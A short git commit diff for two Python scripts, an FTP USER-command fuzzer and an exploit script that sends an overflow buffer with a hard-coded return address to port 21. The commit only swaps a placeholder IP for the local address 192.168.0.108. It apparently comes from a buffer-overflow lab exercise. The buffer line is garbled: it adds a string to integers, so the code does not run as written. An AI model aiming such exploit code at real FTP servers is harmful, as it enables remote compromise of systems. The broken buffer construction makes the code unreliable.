c1a8bbd01cc5e7de683089870f4fb796c015171a
JoaoViana1 <vianajoaoguilherme1@gmail.com>
2021-10-09 12:24:24 -0300

    final

--- conecta.py
+++ conecta.py
@@ -6,7 +6,7 @@ buf = "A" + 485 + "\x3b\x31\x9d\x7c" + "C" + (1100 - 489)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("Digite o ip", 21))
+s.connect(("192.168.0.108", 21))
 r = s.recv(1024)
 print(r)
 
--- fuzzftp.py
+++ fuzzftp.py
@@ -13,6 +13,6 @@ while len(buffer) <= 25:
 for string in buffer:
     print(f"Fuzzing FTP USER com {len(string)} bytes")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("Digite o ip", 21))
+    s.connect(("192.168.0.108", 21))
     s.send("USER "+string+"\r\n")
 
